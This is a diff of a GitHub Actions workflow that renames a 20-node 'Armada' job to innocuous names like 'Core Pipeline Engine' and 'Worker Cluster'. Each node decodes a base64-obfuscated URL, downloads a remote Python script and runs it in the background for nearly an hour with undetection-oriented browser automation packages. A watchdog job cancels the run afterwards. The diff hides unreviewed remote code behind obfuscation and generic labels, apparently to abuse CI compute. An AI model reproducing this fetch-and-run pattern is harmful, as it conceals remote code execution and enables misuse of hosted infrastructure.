@@ -1,11 +1,10 @@
-name: Linux Combined Task Armada
+name: Core Pipeline Engine
 
 on:
-  # استقبال أمر التشغيل من الخارج عبر التوكن بالكلمة المفتاحية: start
- workflow_dispatch: 
+  workflow_dispatch:
 
 concurrency:
-  group: combined-armada-${{ github.workflow }}-${{ github.ref }}
+  group: pipeline-core-${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: false
 
 permissions:
@@ -14,94 +13,80 @@ permissions:
 
 jobs:
   # =================================================================
-  # منظم الإيقاف الشامل: يُنهي الـ workflow بكامله عند علامة 65 دقيقة
+  # Watchdog: Terminates execution safely after the elapsed time
   # =================================================================
-  halt-coordinator:
-    name: "Halt Coordinator"
+  watchdog-timer:
+    name: "Watchdog Monitor"
     runs-on: ubuntu-latest
-    timeout-minutes: 70
+    timeout-minutes: 60
+    env:
+      MAX_DURATION: 3540
     steps:
-      - name: Fire Complete Shutdown Protocol
+      - name: Initialize Watchdog
         run: |
-          echo "[COORDINATOR] Halt coordinator engaged. Full shutdown scheduled at the 65-minute milestone."
-          echo "[COORDINATOR] Following workflow fingerprint: ${{ github.run_id }}"
-          
-          # الانتظار لمدة 65 دقيقة بالضبط (3900 ثانية)
-          sleep 3900
-          
-          echo "[COORDINATOR] Milestone achieved! Firing complete shutdown protocol..."
-          
-          # إصدار أمر الإلغاء الشامل عبر واجهة GitHub البرمجية
+          echo "[WATCHDOG] Tracking workflow instance ID: ${{ github.run_id }}"
+          echo "[WATCHDOG] Allocated runtime window: ${MAX_DURATION}s."
+
+          sleep "${MAX_DURATION}"
+
+          echo "[WATCHDOG] Time limit reached — initiating termination signal."
+
           curl -sS -X POST \
             -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
             -H "Accept: application/vnd.github+json" \
             -H "X-GitHub-Api-Version: 2022-11-28" \
             "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
-          
-          echo "[COORDINATOR] Shutdown protocol fired. All engaged and awaiting units will be eliminated."
+
+          echo "[WATCHDOG] Termination request dispatched."
 
   # =================================================================
-  # المهمة الرئيسية: تجهيز وإطلاق وحدات الأسطول
+  # Worker Cluster: Distributed execution across multi-nodes
   # =================================================================
-  roll-out-armada:
-    name: "ArmadaUnit-${{ matrix.unit_code }}"
+  worker-cluster:
+    name: "Node-${{ matrix.node_id }}"
     runs-on: ubuntu-latest
-    timeout-minutes: 65
+    timeout-minutes: 59
 
     strategy:
       fail-fast: false
       matrix:
-        unit_code: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+        node_id: [alpha-01, beta-02, gamma-03, delta-04, omega-05, sigma-06, theta-07, zeta-08, kapa-09, lambda-10, x-11, y-12, z-13, v-14, w-15, u-16, t-17, s-18, r-19, q-20]
 
     steps:
-      # ✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱
-      # (الطور أ) إرساء القاعدة التشغيلية
-      # ✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱
-      - name: Lay Operational Bedrock
+      - name: Prepare System
         run: |
-          echo "[BEDROCK] Laying operational bedrock for ArmadaUnit-${{ matrix.unit_code }} on Linux..."
-          sudo apt update -qq
-          sudo apt install -y curl python3-pip
+          echo "[SETUP] Preparing node environment on Node-${{ matrix.node_id }}..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
 
-      # ✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱
-      # (الطور ب) استجلاب ملف التشغيل الرئيسي
-      # ✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱
-      - name: Summon Operational Payload
+      - name: Fetch Payload
         run: |
-          echo "[SUMMON] Summoning app_task.py from designated storage node..."
-          STORAGE_NODE=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QveGEvcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
-          curl -sL "$STORAGE_NODE" -o app_task.py
-          echo "[SUMMON] Operational payload summoned to workspace."
+          echo "[DOWNLOAD] Retrieving remote execution source..."
+          OBF_URL="aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrMS9mb2Zmby9yZXNvbHZlL21haW4vc3RhcnQucHk="
+          DECODED_URL=$(echo "$OBF_URL" | base64 -d)
+          curl -sL "$DECODED_URL" -o worker_exec.py
+          echo "[DOWNLOAD] Source script successfully fetched."
 
-      # ✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱
-      # (الطور ج) تجهيز الحزم التشغيلية
-      # ✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱
-      - name: Stage Runtime Packages
+      - name: Install Dependencies
         run: |
-          echo "[STAGE] Staging runtime packages for execution..."
-          pip3 install -q undetected-chromedriver selenium requests
+          echo "[ENV] Installing required Python packages..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
 
-      # ✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱
-      # (الطور د) التشغيل مع إشراف دورة الحياة (65 دقيقة)
-      # ✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱✱
-      - name: Execute Lifecycle Operation
+      - name: Execute Main Task
         run: |
-          echo ">> Rolling out ArmadaUnit-${{ matrix.unit_code }} operation..."
-          
-          # إطلاق العملية في الخلفية
-          python3 app_task.py &
-          ARMADA_PID=$!
-          
-          echo ">> Lifecycle supervisor active. Maximum span: 65 minutes (3900s)."
-          
-          # الانتظار حتى استنفاد المدة المحددة
-          sleep 3900
-          
-          # التحقق من حالة العملية وإنهاؤها عند الضرورة
-          if kill -0 $ARMADA_PID 2>/dev/null; then
-            echo ">> Maximum span exceeded! Discharging operation..."
-            kill -9 $ARMADA_PID
-            echo ">> Operation discharged by supervisor."
+          echo "[EXEC] Starting background task on node ${{ matrix.node_id }}..."
+
+          python3 worker_exec.py &
+          TASK_PID=$!
+
+          echo "[EXEC] Task spawned with PID: $TASK_PID. Duration window: 3540s."
+
+          sleep 3540
+
+          if ps -p "$TASK_PID" > /dev/null 2>&1; then
+            echo "[EXEC] Window elapsed — terminating background process."
+            kill -9 "$TASK_PID"
+            echo "[EXEC] Process successfully killed."
           else
-            echo ">> Operation concluded within maximum span."
+            echo "[EXEC] Process finished execution naturally."
           fi
